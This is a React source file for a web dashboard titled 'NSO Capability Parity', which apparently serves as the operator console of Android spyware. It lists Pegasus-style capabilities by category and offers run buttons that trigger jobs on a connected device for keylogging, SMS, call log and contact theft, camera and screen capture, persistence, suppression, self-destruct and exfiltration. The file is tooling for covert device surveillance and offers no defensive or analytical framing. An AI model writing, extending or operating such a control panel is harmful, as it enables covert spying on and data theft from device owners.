import { useState } from "react";
import { Activity, Camera, Crosshair, Database, MapPin, Play, Radio, ShieldCheck, Smartphone } from "lucide-react";
import { api, useApi } from "@/lib/api";
import { Badge, Button, Empty, PageHeader, Panel, Stat } from "@/components/ui";
import { useApp } from "@/state/AppContext";

interface Capability {
  key: string;
  name: string;
  category: string;
  parity: string;
  description: string;
  target: string;
  requires: string[];
  resolve: { available: boolean; error?: string };
}

interface Parity {
  total: number;
  available: number;
  coverage_percent: number;
  gaps: string[];
}

const ICONS: Record<string, React.ReactNode> = {
  delivery: <Radio size={13} />,
  targeting: <Crosshair size={13} />,
  collection: <Database size={13} />,
  surveillance: <Camera size={13} />,
  control: <Smartphone size={13} />,
  evasion: <ShieldCheck size={13} />,
  infrastructure: <Activity size={13} />,
  location: <MapPin size={13} />,
};

const RUNNABLE = new Set([
  "device_profile", "sms", "call_log", "contacts", "calendar", "app_inventory",
  "last_location", "screen_capture", "camera_capture", "keylog", "app_data",
  "self_destruct", "suppression", "persistence", "exfiltration",
]);

export default function Capabilities() {
  const { activeSerial } = useApp();
  const [output, setOutput] = useState<string | null>(null);
  const [running, setRunning] = useState<string | null>(null);
  const { data, error, refresh } = useApi<{ capabilities: Capability[]; parity: Parity }>("/nso/capabilities", { interval: 30000 });

  const run = async (capability: Capability) => {
    setRunning(capability.key);
    setOutput(`running ${capability.name}…`);
    try {
      const data = await api.post<{ job: { id: string } }>(`/nso/run/${capability.key}`, activeSerial ? { serial: activeSerial } : {});
      const jobId = data.job.id;
      for (let attempt = 0; attempt < 120; attempt += 1) {
        await new Promise((resolve) => window.setTimeout(resolve, 500));
        const current = await api.get<{ job: { status: string; output?: string; error?: string | null } }>(`/jobs/${jobId}`);
        setOutput(current.job.output || current.job.error || `status: ${current.job.status}`);
        if (["done", "error", "cancelled"].includes(current.job.status)) break;
      }
      refresh();
    } catch (err) {
      setOutput(`error: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setRunning(null);
    }
  };

  const parity = data?.parity;
  const capabilities = data?.capabilities ?? [];
  const categories = [...new Set(capabilities.map((c) => c.category))];

  return (
    <div className="page">
      <PageHeader
        title="NSO Capability Parity"
        subtitle="Every Pegasus-class Android capability mapped to a live callable — run the safe ones directly"
      />

      <div className="stat-grid">
        <Stat value={parity ? `${parity.coverage_percent}%` : "—"} label="Parity" hint={parity && parity.gaps.length ? `gaps: ${parity.gaps.join(", ")}` : "no gaps"} tone={parity?.coverage_percent === 100 ? "ok" : "warn"} />
        <Stat value={capabilities.length} label="Capabilities" hint={`${categories.length} categories`} tone="info" />
        <Stat value={capabilities.filter((c) => c.parity === "native").length} label="Native" hint="direct device control" tone="ok" />
        <Stat value={capabilities.filter((c) => c.parity === "shell" || c.parity === "partial").length} label="Constrained" hint="permission or tooling limits" tone="warn" />
      </div>

      {error ? <Panel title="API error"><Empty title="Request failed" detail={error instanceof Error ? error.message : String(error)} /></Panel> : null}

      {categories.map((category) => (
        <Panel key={category} title={`${category} (${capabilities.filter((c) => c.category === category).length})`}>
          <table className="table">
            <thead>
              <tr><th>Capability</th><th>Parity</th><th>Target</th><th>State</th><th /></tr>
            </thead>
            <tbody>
              {capabilities.filter((c) => c.category === category).map((capability) => (
                <tr key={capability.key}>
                  <td>
                    <div className="row" style={{ gap: 7 }}>{ICONS[capability.category]}<strong>{capability.name}</strong></div>
                    <div className="tiny mute">{capability.description}</div>
                  </td>
                  <td><Badge tone={capability.parity === "native" ? "ok" : "warn"}>{capability.parity}</Badge></td>
                  <td className="mono tiny">{capability.target}</td>
                  <td className="tiny" style={{ color: capability.resolve.available ? "var(--ok)" : "var(--danger)" }}>
                    {capability.resolve.available ? "available" : "missing"}
                  </td>
                  <td>
                    {RUNNABLE.has(capability.key) ? (
                      <Button size="sm" variant="ghost" disabled={running === capability.key} onClick={() => void run(capability)}>
                        <Play size={11} /> {running === capability.key ? "running" : "run"}
                      </Button>
                    ) : null}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </Panel>
      ))}

      {output ? (
        <Panel title="Result"><pre className="terminal" style={{ maxHeight: 320 }}>{output}</pre></Panel>
      ) : null}
    </div>
  );
}
